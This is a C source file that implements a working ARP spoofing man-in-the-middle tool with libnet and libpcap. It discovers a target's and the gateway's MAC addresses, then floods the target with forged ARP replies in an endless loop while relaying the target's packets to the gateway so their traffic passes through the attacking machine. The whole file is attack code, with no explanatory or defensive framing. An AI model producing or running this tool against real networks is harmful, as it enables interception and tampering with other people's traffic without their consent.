
#include <libnet.h>
#include <pcap.h>
#include <time.h>
#include <stdio.h>



/* ARP Header, (assuming Ethernet+IPv4)            */
#define ARP_REQUEST 1   /* ARP Request             */
#define ARP_REPLY 2     /* ARP Reply               */
typedef struct arphdr
{
  u_int16_t htype;             /* Hardware Type           */
  u_int16_t ptype;             /* Protocol Type           */
  u_char hlen;                 /* Hardware Address Length */
  u_char plen;                 /* Protocol Address Length */
  u_int16_t oper;              /* Operation Code          */
  u_char sha[6];               /* Sender hardware address */
  u_char spa[4];               /* Sender IP address       */
  u_char tha[6];               /* Target hardware address */
  u_char tpa[4];               /* Target IP address       */
} arphdr_t;

typedef struct ethhdr
{
    unsigned char   h_dest[6];   /* destination eth addr */
    unsigned char   h_source[6]; /* source ether addr    */
    unsigned short  h_proto;            /* packet type ID field */
}ethhdr_t;

#define MAXBYTES2CAPTURE 2048
unsigned char mac_gate_addr[7];
unsigned char mac_tar_addr[7];
unsigned char mac_my_addr[7];
u_char my_ip_addr_str[16];
u_char gateway_ip_addr_str[16];
u_int32_t netaddr = 0;
char *dev;
char target_ip_addr_str[16];
char errbuf[PCAP_ERRBUF_SIZE];      /* Error buffer                           */

//all var

void send_arp_reqest (char target_ip_addr_str[16], int a,int b)
{
  libnet_t * l;                /* the libnet context */
  u_int32_t src_ip_addr, target_ip_addr;
  u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
            mac_src_addr[6];
  struct libnet_ether_addr *src_mac_addr;
  int bytes_written;//wirete packet

  /* reset function */
  l = libnet_init (LIBNET_LINK, NULL, errbuf);
  if (l == NULL)
    {
      fprintf (stderr, "libnet_init() failed: %s\n", errbuf);
      exit (EXIT_FAILURE);
    }

      /* Getting our own MAC and IP addresses */
      src_ip_addr = libnet_get_ipaddr4 (l);
  if (src_ip_addr == -1)
    {
      fprintf (stderr, "Couldn't get own IP address: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }
  src_mac_addr = libnet_get_hwaddr (l);
  if (src_mac_addr == NULL)
    {
      fprintf (stderr, "Couldn't get own IP address: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Getting target IP address */
    switch(a)
    {
      case 1:
      {
            target_ip_addr = libnet_name2addr4 (l, target_ip_addr_str, LIBNET_DONT_RESOLVE);
            break;
      }
      case 2:
      {
            target_ip_addr = inet_addr(target_ip_addr_str);
            break;
      }
      case 3:
      {
          target_ip_addr=netaddr;
          break;
      }
    }


  if (target_ip_addr == -1)
    {
      fprintf (stderr, "Error converting IP address.\n");
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Building ARP header */
      if (libnet_autobuild_arp
           (ARPOP_REQUEST, src_mac_addr->ether_addr_octet,
            (u_int8_t *) (&src_ip_addr), mac_zero_addr,
            (u_int8_t *) (&target_ip_addr), l) == -1)

    {
      fprintf (stderr, "Error building ARP header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Building Ethernet header */
      if (libnet_autobuild_ethernet
           (mac_broadcast_addr, ETHERTYPE_ARP, l) == -1)

    {
      fprintf (stderr, "Error building Ethernet header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Writing packet */
      bytes_written = libnet_write (l);
  if (bytes_written != -1)
  {
    if(b==1)
    {
      printf ("   %d bytes written.\n", bytes_written);
    }
  }

  else
    fprintf (stderr, "Error writing packet: %s\n", libnet_geterror (l));
  bytes_written = libnet_write (l);

  //recive_next_print



  bpf_u_int32 mask = 0;   /* To Store network address and netmask   */
  struct bpf_program filter;   /* Place to store the BPF filter program  */
  pcap_t * descr = NULL;       /* Network interface handler              */
  struct pcap_pkthdr pkthdr;   /* packet information (timestamp,size...) */
  unsigned char *packet = NULL;  /* Received raw data                      */
  arphdr_t * arpheader = NULL; /* Pointer to the ARP header              */
  memset (errbuf, 0, PCAP_ERRBUF_SIZE);
  dev = pcap_lookupdev(errbuf);
  printf ("\n    Start capture packet \n");

      /* error checking */
      if (dev == NULL)

    {
      printf ("%s\n", errbuf);
      exit (1);
    }

      /* Open network device for packet capture */
      if ((descr =
           pcap_open_live (dev, MAXBYTES2CAPTURE, 0, 512, errbuf)) == NULL)
    {
      fprintf (stderr, "ERROR: %s\n", errbuf);
      exit (1);
    }

      /* Look up info from the capture device. */
      if (pcap_lookupnet (dev, &netaddr, &mask, errbuf) == -1)
    {
      fprintf (stderr, "ERROR: %s\n", errbuf);
      exit (1);
    }

      /* Compiles the filter expression into a BPF filter program */
      if (pcap_compile (descr, &filter, "arp", 1, mask) == -1)
    {
      fprintf (stderr, "ERROR: %s\n", pcap_geterr (descr));
      exit (1);
    }

      /* Load the filter program into the packet capture device. */
      if (pcap_setfilter (descr, &filter) == -1)
    {
      fprintf (stderr, "ERROR: %s\n", pcap_geterr (descr));
      exit (1);
    }
  int t = 1;
  while (t <= 5)

    {
      t++;
      bytes_written = libnet_write (l);
      if ((packet = pcap_next (descr, &pkthdr)) == NULL)

        {                       /* Get one packet */
          fprintf (stderr, "ERROR: Error getting the packet.\n", errbuf);

              //exit(1);
        }
      arpheader = (struct arphdr *) (packet + 14);    /* Point to the ARP header */
      if ((ntohs (arpheader->oper) != ARP_REQUEST))

        {
          t = 10;
          pcap_close(descr);
        }
    }


      if (ntohs (arpheader->htype) == 1
          && ntohs (arpheader->ptype) == 0x0800)

    {
      int i=0;
      switch(a)
      {
      case 1://printf target info
      {

          printf ("  Target ip : %s\n", target_ip_addr_str);
          printf ("  Target MAC : ");
          i=0;
          for (i = 0; i < 6; i++)

        {
          printf ("%02X", arpheader->sha[i]);
          mac_tar_addr[i] = arpheader->sha[i];
          if (i == 5)

            {
              break;
            }

          else

            {
              printf (":");
            }
        }
          break;
      }
      case 2://print gateway info
      {
          printf ("  Gateway ip : %s", target_ip_addr_str);
          printf ("  Gateway MAC : ");
          i=0;
          for (i = 0; i < 6; i++)
            {
              printf ("%02X", arpheader->sha[i]);
              mac_gate_addr[i] = arpheader->sha[i];
              if (i == 5)

                {
                  break;
                }

              else

                {
                  printf (":");
                }
            }
          break;
      }
      case 3://print my info
      {
        i=0;
        FILE * fp;
        fp = popen ("hostname -I", "r");
        if (NULL == fp)

          {
            perror ("popen() 실패");
            return -1;
          }
        while (fgets (my_ip_addr_str, 16, fp))
        {
          printf ("  My IP : %s\n", my_ip_addr_str);
          pclose (fp);
          break;
        }

        printf ("  My MAC : ");
        for (i = 0; i < 6; i++)
          {
            printf ("%02X", arpheader->sha[i]);
            mac_my_addr[i] = arpheader->sha[i];
            if (i == 5)

              {
                break;
              }

            else

              {
                printf (":");
              }

         }
        break;
      }
      }


      printf ("\n");

          /* If is Ethernet and IPv4, print packet contents */

    }


}

void get_gate_ip()//gateway getter
{

  FILE * fp;
  fp = popen ("(ip route | head -n 1 | cut -d' ' -f3) ", "r");
  if (NULL == fp)

    {
      perror ("popen() 실패");
      return 0;
    }
  while (fgets (gateway_ip_addr_str, 16, fp))
      printf ("\n   gateway is %s", gateway_ip_addr_str);
      system("clear");
  pclose (fp);
  return 0;
}

void forward_tar2gate()
{
        //const struct sniff_ethernet *ethernet; /* The ethernet header */
        ethhdr_t * ethernethdr = NULL;


        pcap_t *handle;     /* Session handle */
        struct pcap_pkthdr *header; /* The header that pcap gives us */
        u_char *packet;       /* The actual packet */
        dev = pcap_lookupdev(errbuf);

        handle = pcap_open_live(dev, BUFSIZ, 0, 600, errbuf);
        if (handle == NULL) {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            return(2);
        }
        if(dev == NULL)
        {
            printf("%s\n",errbuf);
            exit(1);
        }
        printf("\n      Device = %s",dev);
        printf("\n      Start forward_tar2gate \n\n");
        //print start packet relay

        /* Grab a packet */
        while((pcap_next_ex(handle, &header,&packet))>=0)
        {

          ethernethdr = (struct ethhdr *)(packet);

           usleep(100);
          if ((packet[12]==0x8)&(packet[13]==0x6))//filter arp packet
          {
            continue;
              usleep(100);
          }


          if((mac_tar_addr[3]==packet[9])&&(mac_tar_addr[4]==packet[10])&&(mac_tar_addr[5]==packet[11]))//check packet from target
          {
            packet[0]=mac_gate_addr[0];
            packet[1]=mac_gate_addr[1];
            packet[2]=mac_gate_addr[2];
            packet[3]=mac_gate_addr[3];
            packet[4]=mac_gate_addr[4];
            packet[5]=mac_gate_addr[5];

            packet[6]=mac_my_addr[0];
            packet[7]=mac_my_addr[1];
            packet[8]=mac_my_addr[2];
            packet[9]=mac_my_addr[3];
            packet[10]=mac_my_addr[4];
            packet[11]=mac_my_addr[5];
            //insert raw data

            printf("  %d byte : forward_tar2gate : ",header->caplen);

            for (int i = 0; i < sizeof(target_ip_addr_str); ++i)
            {
              printf("%c",target_ip_addr_str[i]);
            }
            printf(" ==> ");
            for (int i = 0; i < sizeof(gateway_ip_addr_str); ++i)
            {
              printf("%c",gateway_ip_addr_str[i]);
            }

            pcap_sendpacket(handle, packet, header->caplen);//forward packet
          }
        }

        /* And close the session */
        pcap_close(handle);
        return(0);
        //end here
}
void send_arp_reply (int a)
{
  libnet_t * l;                /* the libnet context */
  u_int32_t src_ip_addr, target_ip_addr;
  u_int8_t   mac_src_addr[6];
  struct libnet_ether_addr *src_mac_addr;
  int bytes_written;//wirete packet

  /* reset function */
  l = libnet_init (LIBNET_LINK, NULL, errbuf);
  if (l == NULL)
    {
      fprintf (stderr, "libnet_init() failed: %s\n", errbuf);
      exit (EXIT_FAILURE);
    }
      /* Getting gateway IP address */
    if (a==0)
    {
      src_ip_addr = inet_addr (gateway_ip_addr_str);
    }else{
      src_ip_addr = inet_addr (target_ip_addr_str);
    }

  if (src_ip_addr == -1)
    {
      fprintf (stderr, "Couldn't get own IP address: %s\n",libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }
    /* get source MAC */
  src_mac_addr = libnet_get_hwaddr (l);
  if (src_mac_addr == NULL)
    {
      fprintf (stderr, "Couldn't get own MAC address: %s\n",libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }
      /* Getting target IP address */
      if (a==0)
      {
       target_ip_addr = libnet_name2addr4 (l, target_ip_addr_str, LIBNET_DONT_RESOLVE);
      }else{
        target_ip_addr = inet_addr(gateway_ip_addr_str);
      }

    if (target_ip_addr == -1)
    {
      fprintf (stderr, "Error converting IP address.\n");
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Building ARP header */
    if (a==0)
    {
      if (libnet_autobuild_arp
           (ARPOP_REPLY, src_mac_addr->ether_addr_octet,
            (u_int8_t *) (&src_ip_addr), mac_tar_addr,
            (u_int8_t *) (&target_ip_addr), l) == -1)

      {
        fprintf (stderr, "Error building ARP header: %s\n",
                  libnet_geterror (l));
        libnet_destroy (l);
        exit (EXIT_FAILURE);
      }
    }
    else
    {
      if (libnet_autobuild_arp
           (ARPOP_REPLY, src_mac_addr->ether_addr_octet,
            (u_int8_t *) (&src_ip_addr), mac_gate_addr,
            (u_int8_t *) (&target_ip_addr), l) == -1)

    {
      fprintf (stderr, "Error building ARP header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }
    }


      /* Building Ethernet header */
    if (a==0)
    {
      if (libnet_autobuild_ethernet (mac_tar_addr, ETHERTYPE_ARP, l) ==
           -1)

        {
          fprintf (stderr, "Error building Ethernet header: %s\n",
                    libnet_geterror (l));
          libnet_destroy (l);
          exit (EXIT_FAILURE);
        }
    }
    else
    {
       if (libnet_autobuild_ethernet (mac_gate_addr, ETHERTYPE_ARP, l) ==
           -1)

    {
      fprintf (stderr, "Error building Ethernet header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }
    }


      /* Writing packet */
        sleep(2);
        bytes_written = libnet_write(l);
      if (a==0)
      {
        printf("  target_attack : ");
      }else{
        printf("  gateway_attack : ");
      }
      if (bytes_written != -1)
      {
        printf ("%d bytes written\n", bytes_written);
      }
      else
      {
        fprintf (stderr, "Error writing packet: %s\n",
        libnet_geterror (l));
        }
       libnet_destroy(l);
}


void main ()
{
  /* Getting target IP address */
  printf("\n\n If your computer Can't Relay packet,try Restart this tool\n\n");
  printf ("Target IP address: ");
  scanf("%15s", target_ip_addr_str);
  printf ("\n Injection Successful target ip \n");



  get_gate_ip();
  usleep(500);



  send_arp_reqest(target_ip_addr_str, 1,0);
  send_arp_reqest(gateway_ip_addr_str, 2,0);
  send_arp_reqest(NULL,3,0);


  sleep(2);//delay
  printf ("\n  Send to Target ARP Reply Attack and Packet Relay gone (Y:N)? ");//ask next
  char choice;
  scanf (" %c", &choice);
  if (choice == 'N' | choice == 'n')
    {
      printf ("\n  ========== END ================\n");
    }

  else
    {
      if (choice == 'Y' | choice == 'y')
        {

          pid_t pid;

          if((pid=fork())==-1)
          {
            printf("fork Error");//show error
          }
          if(pid!=0)
          {
              sleep(5);//wait to target mac cache table change
              forward_tar2gate();//forward packet

          }
          else
          {
              while(1)
              {
                send_arp_reply(0);//target attack
              }



          }
          return 0;
        }
      else
        {
          printf ("Don't understand commend\n tool exit");//print end
          exit(1);
        }
    }



}


